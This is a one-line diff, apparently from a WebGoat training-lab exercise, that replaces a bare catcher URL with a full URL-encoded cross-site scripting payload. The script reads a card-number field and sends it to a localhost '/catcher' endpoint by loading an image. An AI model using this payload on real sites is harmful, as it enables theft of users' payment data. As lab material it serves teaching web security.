@@ -1,1 +1,1 @@
-http://localhost:8899/WebGoat/catcher?PROPERTY=yes&stolenCardNum=
+http://localhost:8090/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=%3Cscript%3Evar%20card_num%20%3D%20document.getElementsByName(%22input1%22)%5B0%5D.value%3Bvar%20url%20%3D%20%22http%3A%2F%2Flocalhost%3A8090%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26stolenCardNum%3D%22%20%2B%20card_num%3BXssImage%20%3D%20new%20Image%3BXssImage.src%20%3D%20url%3B%3C%2Fscript%3E
